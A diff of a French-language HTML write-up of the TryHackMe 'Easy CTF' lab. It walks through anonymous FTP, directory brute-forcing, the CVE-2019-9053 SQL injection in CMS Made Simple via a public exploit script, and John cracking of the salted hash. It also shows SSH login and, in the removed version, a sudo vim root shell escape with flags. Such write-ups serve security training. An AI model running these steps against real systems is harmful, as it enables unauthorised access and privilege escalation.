@@ -1,226 +1,321 @@
 <!DOCTYPE html>
 <html lang="fr">
-
 <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Easy CTF — TryHackMe Writeup | Alex171</title>
-    <meta name="description"
-        content="Writeup Easy CTF TryHackMe — FTP anonyme, SQLi CVE-2019-9053, John, SSH, sudo vim." />
-    <link rel="stylesheet" href="../css/style.css" />
-    <link rel="stylesheet" href="../css/animations.css" />
-    <link rel="icon"
-        href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🔐</text></svg>" />
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Easy CTF - TryHackMe Writeup | Alex171</title>
+  <meta name="description" content="Writeup exhaustif et complet"/>
+  <link rel="stylesheet" href="../css/style.css"/>
+  <link rel="stylesheet" href="../css/animations.css"/>
+  <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🔐</text></svg>"/>
+  <style>
+    /* Styling adjustments for exhaustive content */
+    .writeup-content img { max-width: 100%; border-radius: 8px; margin: 1.5rem 0; border: 1px solid var(--border); }
+    .writeup-content blockquote { border-left: 3px solid var(--green); padding-left: 1rem; color: var(--text-muted); margin: 1.5rem 0; font-style: italic; }
+    .writeup-content h1, .writeup-content h2, .writeup-content h3, .writeup-content h4 { color: var(--text-primary); margin-top: 2.5rem; margin-bottom: 1rem; }
+    .writeup-content p { margin-bottom: 1.5rem; line-height: 1.8; color: var(--text-secondary); }
+    .writeup-content ul, .writeup-content ol { margin-bottom: 1.5rem; padding-left: 2rem; }
+    .writeup-content li { margin-bottom: 0.5rem; }
+    .writeup-content code { background: rgba(0,255,65,0.1); padding: 0.2rem 0.4rem; border-radius: 4px; font-family: var(--font-mono); color: var(--green); font-size: 0.9em; }
+    .writeup-content pre code { background: transparent; padding: 0; color: inherit; }
+  </style>
 </head>
-
 <body>
-    <canvas id="matrix-canvas"></canvas>
-    <div class="grid-bg"></div>
-    <nav class="navbar">
-        <a class="nav-logo" href="../index.html">&gt;_<span> alex171</span></a>
-        <div class="nav-links">
-            <a href="../index.html">Accueil</a><a href="../about.html">À propos</a>
-            <a href="../writeups.html" class="active">Writeups</a><a href="../certifications.html">Certifications</a>
-            <a href="../projects.html">Projets</a><a href="../resources.html">Ressources</a>
+<canvas id="matrix-canvas"></canvas><div class="grid-bg"></div>
+<nav class="navbar">
+  <a class="nav-logo" href="../index">&gt;_<span> alex171</span></a>
+  <div class="nav-links">
+    <a href="../index">Accueil</a><a href="../about">À propos</a>
+    <a href="../writeups" class="active">Writeups</a><a href="../certifications">Certifications</a>
+    <a href="../projects">Projets</a><a href="../resources">Ressources</a>
+  </div>
+  <div class="hamburger" id="hamburger"><span></span><span></span><span></span></div>
+</nav>
+<div class="mobile-menu" id="mobile-menu">
+  <a href="../index">Accueil</a><a href="../writeups">Writeups</a>
+  <a href="../certifications">Certifications</a><a href="../resources">Ressources</a>
+</div>
+
+<main>
+<section class="section">
+<div class="container">
+  <div style="font-family:var(--font-mono);font-size:0.78rem;color:var(--text-muted);margin-bottom:1.5rem;" class="fade-in">
+    <a href="../index" style="color:var(--text-muted);">~</a> / <a href="../writeups" style="color:var(--text-muted);">writeups</a> / <span style="color:var(--green);">easy-ctf</span>
+  </div>
+  <div class="writeup-layout">
+    <article class="writeup-content fade-in">
+      <div style="margin-bottom:2rem;">
+        <div style="display:flex;align-items:center;gap:0.75rem;margin-bottom:0.75rem;flex-wrap:wrap;">
+          <span class="tag">FTP</span><span class="tag blue">CMS Made Simple</span><span class="tag purple">SQLi</span><span class="tag">Privilege Escalation</span>
         </div>
-        <div class="hamburger" id="hamburger"><span></span><span></span><span></span></div>
-    </nav>
-    <div class="mobile-menu" id="mobile-menu">
-        <a href="../index.html">Accueil</a><a href="../writeups.html">Writeups</a>
-        <a href="../certifications.html">Certifications</a><a href="../resources.html">Ressources</a>
-    </div>
-
-    <main>
-        <section class="section">
-            <div class="container">
-                <div style="font-family:var(--font-mono);font-size:0.78rem;color:var(--text-muted);margin-bottom:1.5rem;"
-                    class="fade-in">
-                    <a href="../index.html" style="color:var(--text-muted);">~</a> / <a href="../writeups.html"
-                        style="color:var(--text-muted);">writeups</a> / <span
-                        style="color:var(--green);">easy-ctf</span>
-                </div>
-                <div class="writeup-layout">
-                    <article class="writeup-content fade-in">
-                        <div style="margin-bottom:2rem;">
-                            <div
-                                style="display:flex;align-items:center;gap:0.75rem;margin-bottom:0.75rem;flex-wrap:wrap;">
-                                <span class="writeup-platform">TryHackMe</span><span class="diff diff-easy">Easy</span>
-                                <span style="font-family:var(--font-mono);font-size:0.72rem;color:var(--text-muted);">27
-                                    Fév 2026</span>
-                            </div>
-                            <h1 style="font-size:2rem;font-weight:800;color:var(--text-primary);margin-bottom:0.75rem;">
-                                Easy CTF</h1>
-                            <div class="writeup-meta">
-                                <span class="tag">FTP Anonyme</span><span class="tag">SQLi</span><span
-                                    class="tag purple">CVE-2019-9053</span>
-                                <span class="tag">John</span><span class="tag">SSH</span><span class="tag">sudo
-                                    vim</span>
-                            </div>
-                            <p style="color:var(--text-secondary);line-height:1.8;font-size:0.95rem;">
-                                CTF débutant axé sur l'énumération réseau, l'exploitation SQLi dans un CMS, le cracking
-                                de hash et l'élévation via sudo vim.
-                            </p>
-                        </div>
-
-                        <h2 id="recon">Reconnaissance — Nmap</h2>
-                        <div class="code-block">
-                            <div class="code-block-header"><span>bash</span><button class="copy-btn">Copier</button>
-                            </div>
-                            <pre><span class="hl-bash">nmap</span> -sC -sV lab.thm</pre>
-                        </div>
-                        <p>Ports découverts :</p>
-                        <ul>
-                            <li><strong>21/tcp</strong> — FTP vsftpd 3.0.3 (connexion anonyme autorisée)</li>
-                            <li><strong>80/tcp</strong> — Apache 2.4.18</li>
-                            <li><strong>2222/tcp</strong> — SSH (port non standard)</li>
-                        </ul>
-
-                        <h2 id="ftp">Phase 1 — Énumération FTP</h2>
-                        <div class="code-block">
-                            <div class="code-block-header"><span>bash</span><button class="copy-btn">Copier</button>
-                            </div>
-                            <pre><span class="hl-bash">ftp</span> lab.thm
-<span class="hl-comment"># Login: anonymous / (vide)</span>
-ftp&gt; cd pub
-ftp&gt; get ForMitch.txt</pre>
-                        </div>
-                        <p>Contenu de <code>ForMitch.txt</code> : l'utilisateur <strong>Mitch</strong> a un mot de passe
-                            faible identique pour le système.</p>
-
-                        <h2 id="web">Phase 2 — Énumération Web</h2>
-                        <div class="code-block">
-                            <div class="code-block-header"><span>bash</span><button class="copy-btn">Copier</button>
-                            </div>
-                            <pre><span class="hl-bash">gobuster</span> dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt \
-  -u http://lab.thm</pre>
-                        </div>
-                        <p>Répertoire <code>/simple</code> découvert → <strong>CMS Made Simple v2.2.8</strong>.</p>
-
-                        <h2 id="sqli">Phase 3 — SQLi sur CMS Made Simple</h2>
-                        <p>La version 2.2.8 est vulnérable à <strong>CVE-2019-9053</strong> (SQLi time-based blind). On
-                            utilise un script Python :</p>
-                        <div class="code-block">
-                            <div class="code-block-header"><span>bash</span><button class="copy-btn">Copier</button>
-                            </div>
-                            <pre><span class="hl-bash">python3</span> updated_46635.py -u http://lab.thm/simple</pre>
-                        </div>
-                        <div class="code-block">
-                            <div class="code-block-header"><span>output</span><button class="copy-btn">Copier</button>
-                            </div>
-                            <pre><span class="hl-out">Username : mitch
-Salt     : 1dac0d92e9fa6bb2
-Password : 0c01f4468bd75d7a84c7eb73846e8d96
-Email    : admin@admin.com</span></pre>
-                        </div>
-                        <p>On craque le hash MD5+salt avec John :</p>
-                        <div class="code-block">
-                            <div class="code-block-header"><span>bash</span><button class="copy-btn">Copier</button>
-                            </div>
-                            <pre><span class="hl-comment"># Format du hash dans hash.txt :</span>
-<span class="hl-out">mitch:0c01f4468bd75d7a84c7eb73846e8d96$1dac0d92e9fa6bb2</span>
-
-<span class="hl-bash">john</span> --format=dynamic_4 \
-  --wordlist=/usr/share/wordlists/rockyou.txt hash.txt</pre>
-                        </div>
-                        <div class="flag-box">Mot de passe : <strong>secret</strong></div>
-
-                        <h2 id="ssh">Phase 4 — Accès SSH</h2>
-                        <div class="code-block">
-                            <div class="code-block-header"><span>bash</span><button class="copy-btn">Copier</button>
-                            </div>
-                            <pre><span class="hl-bash">ssh</span> mitch@lab.thm -p 2222
-<span class="hl-comment"># Password: secret</span></pre>
-                        </div>
-                        <div class="flag-box">User flag : <code>G00d j0b, keep up!</code></div>
-
-                        <h2 id="privesc">Phase 5 — Escalade de privilèges</h2>
-                        <div class="code-block">
-                            <div class="code-block-header"><span>bash</span><button class="copy-btn">Copier</button>
-                            </div>
-                            <pre><span class="hl-bash">sudo</span> -l
-<span class="hl-out">User mitch may run : (root) NOPASSWD: /usr/bin/vim</span>
-
-<span class="hl-bash">sudo</span> vim -c ':!/bin/bash'</pre>
-                        </div>
-                        <p>vim peut exécuter des commandes shell avec <code>:!commande</code>. On obtient un shell root
-                            :</p>
-                        <div class="flag-box">Root flag : <code>W3ll d0n3. You made it!</code></div>
-
-                        <h2 id="lessons">Leçons apprises</h2>
-                        <ul>
-                            <li>Le FTP anonyme ne doit jamais contenir d'informations sensibles</li>
-                            <li>Toujours mettre à jour les CMS — CVE-2019-9053 existe depuis 2019</li>
-                            <li>sudo NOPASSWD sur un éditeur (vim, nano, less) = privesc immédiat via
-                                <code>:!bash</code></li>
-                            <li>Préférer des mots de passe forts et uniques pour chaque service</li>
-                        </ul>
-
-                        <div
-                            style="margin-top:2rem;padding-top:1.5rem;border-top:1px solid var(--border);display:flex;gap:1rem;flex-wrap:wrap;">
-                            <a href="../writeups.html" class="btn btn-outline">← Tous les writeups</a>
-                            <a href="chill-hack.html" class="btn btn-outline">Suivant : Chill Hack →</a>
-                        </div>
-                    </article>
-
-                    <aside class="writeup-sidebar">
-                        <div class="sidebar-title">Table des matières</div>
-                        <div class="toc-list">
-                            <div class="toc-item" data-target="recon">Reconnaissance</div>
-                            <div class="toc-item" data-target="ftp">FTP Anonyme</div>
-                            <div class="toc-item" data-target="web">Énumération Web</div>
-                            <div class="toc-item" data-target="sqli">SQLi — CMS Simple</div>
-                            <div class="toc-item" data-target="ssh">Accès SSH</div>
-                            <div class="toc-item" data-target="privesc">Privesc — sudo vim</div>
-                            <div class="toc-item" data-target="lessons">Leçons apprises</div>
-                        </div>
-                        <hr style="border-color:var(--border);margin:1rem 0;" />
-                        <div
-                            style="display:flex;flex-direction:column;gap:0.4rem;font-size:0.78rem;font-family:var(--font-mono);">
-                            <div><span style="color:var(--text-muted);">Plateforme :</span> <span
-                                    style="color:var(--green);">TryHackMe</span></div>
-                            <div><span style="color:var(--text-muted);">Difficulté :</span> <span
-                                    style="color:#4ade80;">Easy</span></div>
-                            <div><span style="color:var(--text-muted);">Date :</span> <span
-                                    style="color:var(--text-secondary);">27 Fév 2026</span></div>
-                            <div><span style="color:var(--text-muted);">CVE :</span> <span
-                                    style="color:#a78bfa;">CVE-2019-9053</span></div>
-                        </div>
-                    </aside>
-                </div>
-            </div>
-        </section>
-    </main>
-
-    <footer>
-        <div class="container">
-            <div class="footer-inner">
-                <div class="footer-name">&gt;_ alex171-studo</div>
-                <div class="footer-links"><a href="../writeups.html">Writeups</a><a href="../index.html">Accueil</a>
-                </div>
-                <div class="footer-copy">© 2026 Alex171-studo</div>
-            </div>
+        <h1 style="font-size:2rem;font-weight:800;color:var(--text-primary);margin-bottom:0.75rem;">Easy CTF - TryHackMe Writeup</h1>
+        <div style="font-family:var(--font-mono);font-size:0.85rem;color:var(--text-muted);margin-bottom:2rem;">
+            Publié le 2026-02-27 • TryHackMe
         </div>
-    </footer>
+      </div>
 
-    <div id="interactive-terminal" class="terminal-window">
-        <div class="terminal-titlebar">
-            <div class="terminal-dot dot-red"></div>
-            <div class="terminal-dot dot-yellow"></div>
-            <div class="terminal-dot dot-green"></div>
-            <span class="terminal-title">Terminal interactif</span>
-            <button id="term-close"
-                style="background:none;border:none;color:var(--text-muted);cursor:pointer;margin-left:auto;">✕</button>
-        </div>
-        <div class="term-interactive-body" id="term-output"></div>
-        <div class="term-input-line">
-            <span class="t-prompt" style="white-space:nowrap;font-size:0.8rem;">alex@portfolio:~$</span>
-            <input type="text" id="term-input" class="term-input" placeholder="help" autocomplete="off"
-                spellcheck="false" />
-        </div>
-    </div>
-    <button class="term-toggle-btn" id="term-toggle">&gt;_</button>
-    <script src="../js/main.js"></script>
-    <script src="../js/terminal.js"></script>
+      <h3 id="objectif">Objectif</h3>
+<p>CTF de niveau débutant axé sur les techniques fondamentales de test d'intrusion</p>
+<h3 id="techniques-utilisees">Techniques utilisées</h3>
+<p>Énumération du réseau, énumération web, exploitation des injections SQL, force brute SSH, élévation de privilèges via des binaires mal configurés</p>
+<h2 id="reconaissance">Reconaissance</h2>
+<p>Détection des ports ouverts avec  <code>nmap</code></p>
+<div class="code-block"><div class="code-block-header"><div class="code-dots"><span class="code-dot" style="background:#ff5f56"></span><span class="code-dot" style="background:#ffbd2e"></span><span class="code-dot" style="background:#27c93f"></span></div><span class="code-title">bash</span><button class="copy-btn">Copier</button></div><pre><code class="language-bash"><span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">nmap -sC -sV lab.thm</span>
+</code></pre></div>
+<p>Résultat du scan</p>
+<div class="code-block"><div class="code-block-header"><div class="code-dots"><span class="code-dot" style="background:#ff5f56"></span><span class="code-dot" style="background:#ffbd2e"></span><span class="code-dot" style="background:#27c93f"></span></div><span class="code-title">bash</span><button class="copy-btn">Copier</button></div><pre><code class="language-bash"><span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">PORT     STATE SERVICE VERSION</span>
+<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">21/tcp   open  ftp     vsftpd 3.0.3</span>
+<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">| ftp-anon: Anonymous FTP login allowed (FTP code 230)</span>
+<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">|_Can't get directory listing: TIMEOUT</span>
+<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))</span>
+<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">|_http-server-header: Apache/2.4.18 (Ubuntu)</span>
+<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">|_http-title: Apache2 Ubuntu Default Page: It works</span>
+<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">| http-robots.txt: 2 disallowed entries </span>
+<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">|_/ /openemr-5_0_1_3 </span>
+<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)</span>
+<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">| ssh-hostkey: </span>
+<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">|   2048 294269149ecad917988c27723acda923 (RSA)</span>
+<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">|   256 9bd165075108006198de95ed3ae3811c (ECDSA)</span>
+<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">|_  256 12651b61cf4de575fef4e8d46e102af6 (ED25519)</span>
+<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel</span>
+</code></pre></div>
+<p>Ports ouverts</p>
+<ul>
+<li>Port 21: Port FTP(vsftpd 3.0.3) et on peut se connecter en tant qu’ <code>anonymous</code></li>
+<li>Port 80 : Port HTTP</li>
+<li>Port 2222: SSH tournant sur un port non standard</li>
+</ul>
+<h3 id="phase1-enumeration-ftp">Phase1: Enumération FTP</h3>
+<div class="code-block"><div class="code-block-header"><div class="code-dots"><span class="code-dot" style="background:#ff5f56"></span><span class="code-dot" style="background:#ffbd2e"></span><span class="code-dot" style="background:#27c93f"></span></div><span class="code-title">bash</span><button class="copy-btn">Copier</button></div><pre><code class="language-bash"><span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">ftp lab.thm</span>
+</code></pre></div>
+<p>Je me connecte avec username <code>anonymous</code> et en laissant le champ password vide</p>
+<div class="code-block"><div class="code-block-header"><div class="code-dots"><span class="code-dot" style="background:#ff5f56"></span><span class="code-dot" style="background:#ffbd2e"></span><span class="code-dot" style="background:#27c93f"></span></div><span class="code-title">bash</span><button class="copy-btn">Copier</button></div><pre><code class="language-bash"><span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">Connected to lab.thm.</span>
+<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">220 (vsFTPd 3.0.3)</span>
+<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">Name (lab.thm:root): anonymous</span>
+<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">230 Login successful.</span>
+<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">Remote system type is UNIX.</span>
+<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">Using binary mode to transfer files.</span>
+<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">ftp&gt; ls</span>
+<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">200 EPRT command successful. Consider using EPSV.</span>
+<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">150 Here comes the directory listing.</span>
+<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">drwxr-xr-x    2 ftp      ftp          4096 Aug 17  2019 pub</span>
+<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">226 Directory send OK.</span>
+<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">ftp&gt; cd pub</span>
+<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">250 Directory successfully changed.</span>
+<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">ftp&gt; ls</span>
+<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">200 EPRT command successful. Consider using EPSV.</span>
+<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">150 Here comes the directory listing.</span>
+<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">-rw-r--r--    1 ftp      ftp           166 Aug 17  2019 ForMitch.txt</span>
+<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">226 Directory send OK.</span>
+<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">ftp&gt; get ForMitch.txt</span>
+<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">local: ForMitch.txt remote: ForMitch.txt</span>
+<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">200 EPRT command successful. Consider using EPSV.</span>
+<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">150 Opening BINARY mode data connection for ForMitch.txt (166 bytes).</span>
+<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">100% |*********************|   166        1.95 MiB/s    00:00 ETA</span>
+<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">226 Transfer complete.</span>
+<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">166 bytes received in 00:00 (0.39 KiB/s)</span>
+<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">ftp&gt; exit</span>
+<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">221 Goodbye.</span>
+</code></pre></div>
+<p>Vérifions le contenu du fichier</p>
+<div class="code-block"><div class="code-block-header"><div class="code-dots"><span class="code-dot" style="background:#ff5f56"></span><span class="code-dot" style="background:#ffbd2e"></span><span class="code-dot" style="background:#27c93f"></span></div><span class="code-title">bash</span><button class="copy-btn">Copier</button></div><pre><code class="language-bash"><span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">bat ForMitch.txt</span>
+</code></pre></div>
+<div class="code-block"><div class="code-block-header"><div class="code-dots"><span class="code-dot" style="background:#ff5f56"></span><span class="code-dot" style="background:#ffbd2e"></span><span class="code-dot" style="background:#27c93f"></span></div><span class="code-title">bash</span><button class="copy-btn">Copier</button></div><pre><code class="language-bash"><span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">───────┬──────────────────────────────────────────────────────────</span>
+<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">       │ File: ForMitch.txt</span>
+<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">───────┼──────────────────────────────────────────────────────────</span>
+<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">   1   │ Dammit man... you'te the worst dev i've seen. You set the</span>
+<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">       │  same pass for the system user, and the password is so we</span>
+<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">       │ ak... i cracked it in seconds. Gosh... what a mess!</span>
+<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">───────┴──────────────────────────────────────────────────────────</span>
+</code></pre></div>
+<p>Interessant! Ce fichier indique que :</p>
+<ul>
+<li>Il existe un utilisateur nommé Mitch</li>
+<li>Son mot de passe est faible et crackable</li>
+<li>Le même mot de passe est utilisé pour accéder au système</li>
+</ul>
+<h2 id="phase-2-brute-force-des-repertoires">Phase 2: Brute force des répertoires</h2>
+<p>Tout d’abord le fichier robots.txt ne nous apporte rien d’interressant. Listons les répertoires cachés avec Gobuster</p>
+<div class="code-block"><div class="code-block-header"><div class="code-dots"><span class="code-dot" style="background:#ff5f56"></span><span class="code-dot" style="background:#ffbd2e"></span><span class="code-dot" style="background:#27c93f"></span></div><span class="code-title">bash</span><button class="copy-btn">Copier</button></div><pre><code class="language-bash"><span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -u http://lab.thm</span>
+</code></pre></div>
+<div class="code-block"><div class="code-block-header"><div class="code-dots"><span class="code-dot" style="background:#ff5f56"></span><span class="code-dot" style="background:#ffbd2e"></span><span class="code-dot" style="background:#27c93f"></span></div><span class="code-title">bash</span><button class="copy-btn">Copier</button></div><pre><code class="language-bash"><span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">===============================================================</span>
+<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">Gobuster v3.8</span>
+<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span>
+<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">===============================================================</span>
+<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">[+] Url:                     http://lab.thm</span>
+<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">[+] Method:                  GET</span>
+<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">[+] Threads:                 10</span>
+<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt</span>
+<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">[+] Negative Status codes:   404</span>
+<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">[+] User Agent:              gobuster/3.8</span>
+<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">[+] Timeout:                 10s</span>
+<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">===============================================================</span>
+<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">Starting gobuster in directory enumeration mode</span>
+<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">===============================================================</span>
+</code></pre></div>
+<p>On a un répertoire <code>simple</code> qui existe. Explorons le. </p>
+<h2 id="phase-3-cms-simple-exploration">Phase 3: CMS Simple Exploration</h2>
+<p>L'accès à <code>http://lab.thm/simple</code> révèle une installation de CMS Made Simple. La version est indiquée en bas de la page : CMS Made Simple version 2.2.8.</p>
+<p>En recherchant sur Google une vulnérabilité pour cette version on tombe sur  <strong>CMS Made Simple &lt; 2.2.10 — SQL Injection (CVE-2019–9053).</strong> </p>
+<p>Il s'agit d'une vulnérabilité d'injection SQL à laquelle notre version est sensible !</p>
+<p>Pour exploiter cette vulnérabilité j’ai utiliser le script python de Dh4nuJ4</p>
+<div class="code-block"><div class="code-block-header"><div class="code-dots"><span class="code-dot" style="background:#ff5f56"></span><span class="code-dot" style="background:#ffbd2e"></span><span class="code-dot" style="background:#27c93f"></span></div><span class="code-title">bash</span><button class="copy-btn">Copier</button></div><pre><code class="language-bash"><span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">git clone https://github.com/Dh4nuJ4/SimpleCTF-UpdatedExploit.git</span>
+<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">cd SimpleCTF-UpdatedExploit</span>
+<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">pip install requests termcolor</span>
+</code></pre></div>
+<p>Ensuite démarons l’exploit </p>
+<div class="code-block"><div class="code-block-header"><div class="code-dots"><span class="code-dot" style="background:#ff5f56"></span><span class="code-dot" style="background:#ffbd2e"></span><span class="code-dot" style="background:#27c93f"></span></div><span class="code-title">bash</span><button class="copy-btn">Copier</button></div><pre><code class="language-bash"><span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">python3 updated_46635.py -u http://lab.thm/simple</span>
+</code></pre></div>
+<p>Après exécution, l’exploit découvre:</p>
+<ul>
+<li>Username: mitch</li>
+<li>Salt: 1dac0d92e9fa6bb2</li>
+<li>Password: 0c01f4468bd75d7a84c7eb73846e8d96</li>
+<li>Email: admin@admin.com</li>
+</ul>
+<p>Crackons ce hash avec  john. Pour ça on copie le contenu dans un fichier hash.txt suivant le format username:password$salt</p>
+<div class="code-block"><div class="code-block-header"><div class="code-dots"><span class="code-dot" style="background:#ff5f56"></span><span class="code-dot" style="background:#ffbd2e"></span><span class="code-dot" style="background:#27c93f"></span></div><span class="code-title">console</span><button class="copy-btn">Copier</button></div><pre><code>mitch:0c01f4468bd75d7a84c7eb73846e8d96$1dac0d92e9fa6bb2
+</code></pre></div>
+<div class="code-block"><div class="code-block-header"><div class="code-dots"><span class="code-dot" style="background:#ff5f56"></span><span class="code-dot" style="background:#ffbd2e"></span><span class="code-dot" style="background:#27c93f"></span></div><span class="code-title">bash</span><button class="copy-btn">Copier</button></div><pre><code class="language-bash"><span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">john --format=dynamic_4 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt</span>
+</code></pre></div>
+<div class="code-block"><div class="code-block-header"><div class="code-dots"><span class="code-dot" style="background:#ff5f56"></span><span class="code-dot" style="background:#ffbd2e"></span><span class="code-dot" style="background:#27c93f"></span></div><span class="code-title">bash</span><button class="copy-btn">Copier</button></div><pre><code class="language-bash"><span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">Using default input encoding: UTF-8</span>
+<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">Loaded 1 password hash (dynamic_4 [md5($s.$p) (OSC) 128/128 SSE2 4x3])</span>
+<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">Warning: no OpenMP support for this hash type, consider --fork=4</span>
+<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">Note: Passwords longer than 10 [worst case UTF-8] to 31 [ASCII] rejected</span>
+<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status</span>
+<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">secret           (mitch)     </span>
+<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">1g 0:00:00:00 DONE (2026-02-27 14:55) 50.00g/s 84000p/s 84000c/s 84000C/s 123456..kenny</span>
+<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">Use the "--show --format=dynamic_4" options to display all of the cracked passwords reliably</span>
+<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">Session completed. </span>
+</code></pre></div>
+<p>Le mot de passe est donc <code>secret</code>. </p>
+<h2 id="phase4-acces-ssh">Phase4 : Accès SSH</h2>
+<p>Nous pouvons maintenant nous connecter avec les informations obtenus</p>
+<div class="code-block"><div class="code-block-header"><div class="code-dots"><span class="code-dot" style="background:#ff5f56"></span><span class="code-dot" style="background:#ffbd2e"></span><span class="code-dot" style="background:#27c93f"></span></div><span class="code-title">bash</span><button class="copy-btn">Copier</button></div><pre><code class="language-bash"><span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">ssh mitch@lab.thm -p 2222</span>
+<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">Password: secret</span>
+</code></pre></div>
+<h2 id="phase5-obtention-du-user-flag">Phase5: Obtention du User Flag</h2>
+<div class="code-block"><div class="code-block-header"><div class="code-dots"><span class="code-dot" style="background:#ff5f56"></span><span class="code-dot" style="background:#ffbd2e"></span><span class="code-dot" style="background:#27c93f"></span></div><span class="code-title">bash</span><button class="copy-btn">Copier</button></div><pre><code class="language-bash"><span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">mitch@Machine:~$ pwd</span>
+<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">/home/mitch</span>
+<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">mitch@Machine:~$ ls</span>
+<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">user.txt</span>
